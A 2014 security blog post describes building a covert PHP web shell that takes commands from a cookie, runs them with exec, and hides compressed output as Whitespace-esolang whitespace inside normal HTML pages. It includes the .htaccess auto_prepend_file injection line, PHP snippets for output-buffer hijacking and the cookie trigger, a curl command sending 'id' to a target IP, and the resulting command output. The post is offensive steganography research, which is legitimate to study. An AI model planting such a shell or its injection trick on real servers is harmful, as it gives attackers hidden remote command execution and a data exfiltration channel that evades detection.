---
title: Whitespace Esolang Covert Channel / Steganography
author: Jan Seidl
type: post
date: 2014-02-19T14:31:02+00:00
url: /posts/whitespace-esolang-covert-channel-steganography/
categories:
  - Malware
  - Penetration Testing
  - Steganography
tags:
  - covert channel
  - esolang
  - php
  - steganography
  - whitespace

---
I&#8217;ve been always a fan of <a href="http://en.wikipedia.org/wiki/Esoteric_programming_language" target="_blank">esoteric programming languages (esolangs)</a>. These programming languages are generally made just for fun, mostly in universities or for challenges. <a href="http://www.wikipedia.org" target="_blank">Wikipedia</a> describes as the following:

> An esoteric programming language (esolang, in short) is a programming language designed to test the boundaries of computer programming language design, as a proof of concept, or as a joke. The use of esoteric distinguishes these languages from programming languages that working developers use to write software.

You&#8217;ve probably seen some of the famous ones like <a href="http://en.wikipedia.org/wiki/Brainfuck" target="_blank">brainfuck</a> and <a href="http://en.wikipedia.org/wiki/Shakespeare_(programming_language)" target="_blank">shakespeare</a> language. Some months ago I stumbled upon this funny one called &#8220;<a href="http://en.wikipedia.org/wiki/Whitespace_%28programming_language%29" target="_blank">Whitespace</a>&#8220;. 

## About Whitespace esolang

Whitespace is an esolang created by Edwin Brady and Chris Morris from the University of Durham in released in 2003. Their opcodes consists only of **spaces**, **tabs** and **line-feeds**. Interesting, huh?

Here&#8217;s a sample _Hello, World!_ program in Whitespace _(red = spaces, blue = tabs, black = VIM cursor)_:

<img src="https://wroot.org/wp/wp-content/uploads/2014/02/Whitespace_in_vim21.png" alt="Whitespace" width="500" height="306" class="aligncenter size-full wp-image-8918" srcset="https://wroot.org/wp/wp-content/uploads/2014/02/Whitespace_in_vim21.png 500w, https://wroot.org/wp/wp-content/uploads/2014/02/Whitespace_in_vim21-300x183.png 300w" sizes="(max-width: 500px) 100vw, 500px" />

This &#8220;feature&#8221; came into my mind as a very difficult pattern to detect through computational means since the language natively discards every other character permitting this language to be merged arbitrarily with any other text&#8230;. and even some code ;)

I&#8217;ve then remembered that <acronym title="HyperText Markup Language">HTML</acronym> has cool workarounds with repeated spaces and tabs when it comes to parsing and rendering, so I could be able to inject Whitespace opcodes into <acronym title="HyperText Markup Language">HTML</acronym> without breaking it and with minor rendering quirks.

So the weather was crappy, beer was over and I decided to make a covert shell with that.

## Creating the covert shell

<acronym title="Pre-Hypertext Processing">PHP</acronym> is one of the most used languages in websites and power popular platforms like WordPress and MediaWiki. <acronym title="Pre-Hypertext Processing">PHP</acronym> has an output buffering system (`ob_start`, `ob_get_contents` etc) and a widely abused feature called `auto_prepend_file`. These would be enough to setup my covert shell.

I quickly spawned two files, one `<a href="https://github.com/jseidl/whitespace/blob/master/wcc/.htaccess" target="_blank">.htaccess</a>` to handle my shell injection via `auto_prepend_file` (very known and old trick) and one `<a href="https://github.com/jseidl/whitespace/blob/master/wcc/wcc.php" target="_blank">wcc.php</a>` to do the magic.

{{< highlight apacheconf >}}
php_value auto_prepend_file "wcc.php"
{{< /highlight >}}

This would ensure my shell works on **almost any php page** on the target acessible through the browser.

First thing I had to do was ensure that the I&#8217;ve **got the output buffer after all other possible output buffer handlers** had processed it. There&#8217;s quite a time since I left web developing but I did remembered about `<a href="http://www.php.net/manual/en/function.register-shutdown-function.php" target="_blank">register_shutdown_function</a>` that is used to, you know, register functions that will run before the script exits.

I could&#8217;ve stopped there, but I&#8217;ve wanted to prevent other `register_shutdown_functions` to win the race and alter the output after I did, so <a href="http://www.php.net/manual/en/function.register-shutdown-function.php#98200" target="_blank">I did some research</a> and saw that if you call `register_shutdown_function` from a `register_shutdown_function`, it will have high chances of being the last shutdown function (unless other `register_shutdown_function` did the same trick).

{{< highlight php >}}
function wcc_init() {
	# ... snip ...

	# Register shutdown function that registers a 
	# shutdown function as last in chain ;)
	# (unless another shutdown functions does the same)
	register_shutdown_function('wcc_shutdown', $cmd_output);
}//end :: wcc_init
{{< /highlight >}}

And further down&#8230;

{{< highlight php >}}
function wcc_shutdown($whitespace_payload) {
	register_shutdown_function('wcc_merge_output', $whitespace_payload); # register last ;)
}//end :: wcc_shutdown
{{< /highlight >}}

That took care of ensuring that my `wcc_merge_output` function will run at the very end of any script.

Now it&#8217;s time to play with the output buffer and do the whitespace magic. I&#8217;ve placed `ob_start` on my `wcc_init` function that is prepended by `.htaccess` so as soon as script starts, output buffering is enabled.

If the magic cookie key is set, it will run the command with `exec` (for testing purposes, you can change to whichever method you want), `gzdeflate`-it and convert to whitespace language.

I won&#8217;t comment on the actual code responsible to converting from <acronym title="American Standard Code for Information Interchange">ASCII</acronym> to Whitespace but FYI, it basically converts each char to binary, pushes each character to Whitespace Stack, then adds &#8220;print char from stack&#8221; N times, where `N = len(string)` and finally adds the &#8220;end program&#8221; sentence. 

_You can read more about the internals of Whitespace Language on the <a href="http://compsoc.dur.ac.uk/whitespace/tutorial.php" target="_blank">official page&#8217;s tutorial</a>. If you&#8217;re interested, you can check the `<a href="https://github.com/jseidl/whitespace/blob/master/wcc/wcc.php#L178" target="_blank">wcc_whitespace_print_string</a>` function source-code._

The `wcc_init` function ended up looking like this:

{{< highlight php >}}
function wcc_init() {
	if (
		!isset($_COOKIE[WCC_COOKIE_KEY]) ||
		empty($_COOKIE[WCC_COOKIE_KEY])
	) return false;

	ob_start();

	$cmd_output = wcc_exec($_COOKIE[WCC_COOKIE_KEY]);

	register_shutdown_function('wcc_shutdown', $cmd_output);

	return true;

}//end :: wcc_init
{{< /highlight >}}

When the original script finishes its job and execution is passed to my shutdown function, `wcc_merge_output` will grab the contents of the output buffer, merge, display and exit.

{{< highlight php >}}
function wcc_merge_output($whitespace_payload) {

	$page_content = ob_get_contents();
	ob_end_clean();

	# "Sanitize" page content and tokenize
	# ... snip ...

	# Build Content
	$final_content = wcc_build_content($whitespace_tokens, $content_tokens);

	# Show content & exit
	print $final_content;
	exit(0);

}//end :: wcc_merge_output
{{< /highlight >}}

## The caveat

Of course, nothing comes easy. I decided to test the **WCC** on a real (little old) WordPress install so I pulled up an old VM that I had it installed.

My buffer was being ignored or duplicated, depending on the page. Turns out I did not account the race condition that other codes might introduce when handling output buffer and they were flushing the buffer before I could act, so I created a little trap to prevent others from messing with it.

{{< highlight php >}}
# in script start
global $buffer; 

# in wcc_init()
# this trap will be called when something 
# tries to display the output buffer
ob_start("wcc_output_trap"); 

# Trap function added
# Someone tries to output the buffer before us
# and ... <acronym title="Oh my goodness">OMG</acronym>! IT'S A TRAP!
function wcc_output_trap($current_buffer) {
    global $buffer;
    $buffer .= $current_buffer; # let's save it for later
    return ''; # prevents showing the buffer yet
}//end :: wcc_output_trap

# in wcc_merge_output()
$page_content = $buffer.ob_get_contents(); # now we can show everything
{{< /highlight >}}

As from the documentation for the `callback` parameter from `ob_start`:

> The function will be called when the output buffer is flushed (sent) or cleaned (with ob\_flush(), ob\_clean() or similar function) or when the output buffer is flushed to the browser at the end of the request. 

That did the trick.

## The sanitization and tokenization process is quite simple.

For content, first I replace all **tabs** to **spaces**, place each line in an array with respective line number as index. Then I remove the linefeeds from the each line and break the line into tokens separated by spaces.

For whitespace, I just convert a string to an array of characters. Dead simple.

## Merging content

This is quite simple also. For each whitespace token (character/opcode), I add one of the content parts (tokens) followed by the whitespace token.

If whitespace payload is less than content, when I finish adding whitespace tokens, I just add the remaining pieces glued toghether by spaces and keep their line feeds.

If whitespace payload is greater than content, I just add raw whitespace payload to the end of the <acronym title="HyperText Markup Language">HTML</acronym> content. This brings up some issues on detection but it&#8217;s better than no output at all. Just choose a page with more content.

You can check it out the [source-code of this routine][1].

## Issuing requests to the shell

In this PoC I&#8217;ve used the classic `Cookie` command input trick.

{{< highlight php >}}
define('WCC_COOKIE_KEY', 'wcc_cmd');
$_COOKIE[WCC_COOKIE_KEY];
{{< /highlight >}}

So through a shell, you can do something like

{{< highlight bash >}}
curl -s -H 'Cookie: wcc_cmd=id' http://10.1.1.100/wcc/ -o out.html
{{< /highlight >}}

Then parse with any Whitespace interpreter and inflate the payload again

{{< highlight bash >}}
./wspace out.html | head -n -3 | php inflate.php
{{< /highlight >}}

_`<a href="https://github.com/jseidl/whitespace/blob/master/wcc/inflate.php" target="_blank">inflate.php</a>` reads input from `stdin` and passes to `gzinflate`._

## Result?

{{< highlight bash >}}
= WCC = Command output ==========================

uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
= WCC = <acronym title="End of file">EOF</acronym> =====================================
{{< /highlight >}}

## Visual Differences

For some content you might get some quirks, for others, not. 

Here&#8217;s a screenshot from both pages sources. First with embedded Whitespace command output and the second is the original.

[<img src="https://wroot.org/wp/wp-content/uploads/2014/02/w2-300x179.png" alt="Whitespace HTML Source Comparison" width="300" height="179" class="aligncenter size-medium wp-image-8927" srcset="https://wroot.org/wp/wp-content/uploads/2014/02/w2-300x179.png 300w, https://wroot.org/wp/wp-content/uploads/2014/02/w2-1024x613.png 1024w" sizes="(max-width: 300px) 100vw, 300px" />][2]

Here&#8217;s a screenshot from both pages rendered <acronym title="HyperText Markup Language">HTML</acronym>. First with embedded Whitespace command output and the second is the original. (Don&#8217;t mind the images, this theme has random header images)

[<img src="https://wroot.org/wp/wp-content/uploads/2014/02/w1-300x167.png" alt="Whitespace Rendered HTML Comparison" width="300" height="167" class="aligncenter size-medium wp-image-8926" srcset="https://wroot.org/wp/wp-content/uploads/2014/02/w1-300x167.png 300w, https://wroot.org/wp/wp-content/uploads/2014/02/w1-1024x570.png 1024w" sizes="(max-width: 300px) 100vw, 300px" />][3]

## Size discrepancies

Since we&#8217;re mostly changing stuff than adding, our file size ends up very close to the original if you have enought <acronym title="HyperText Markup Language">HTML</acronym> to fit your command output. Below is the comparison of the original <acronym title="HyperText Markup Language">HTML</acronym> with one with the output from some commands.

I&#8217;ve ran `id`, `ip a show`, `ps aux` and `ls -al`. `id` was the only one that fit entirely in the <acronym title="HyperText Markup Language">HTML</acronym> I&#8217;ve got (pretty short page). The others resulted in raw whitespace appended to the end of the original <acronym title="HyperText Markup Language">HTML</acronym>.

{{< highlight bash >}}
<pre lang="bash">$ ls -al /tmp/{original,cmd*}.html
-rw-rw-r-- 1 jseidl jseidl 14778 Feb 18 20:47 /tmp/original.html
-rw-rw-r-- 1 jseidl jseidl 14191 Feb 18 20:36 /tmp/cmd_id.html
-rw-rw-r-- 1 jseidl jseidl 16986 Feb 18 20:50 /tmp/cmd_ip_a_show.html
-rw-rw-r-- 1 jseidl jseidl 19013 Feb 18 20:50 /tmp/cmd_ls_al.html
-rw-rw-r-- 1 jseidl jseidl 41000 Feb 18 20:50 /tmp/cmd_ps_aux.html
{{< /highlight >}}

_<acronym title="Laughing out loud">LOL</acronym>. In some cases it even &#8220;minifies&#8221; a little&#8230;_

## Final notes

  * I did not put any effort on encoding/encrypting the cookie or commands or whatever. This is only to test the covert response channel.
  * I also know that cookie based command passing is easily detectable. And are many other better ways to do that.
  * Of course there are better methods than `exec` to run code. This is also not the point of this research.

## Source code & files

All files are available on my <a href="https://github.com/jseidl/whitespace/tree/master/wcc" target="_blank">github repo</a>. Feel free to download, play, fork, whatever.

 [1]: https://github.com/jseidl/whitespace/blob/master/wcc/wcc.php#L92
 [2]: https://wroot.org/wp/wp-content/uploads/2014/02/w2.png
 [3]: https://wroot.org/wp/wp-content/uploads/2014/02/w1.png
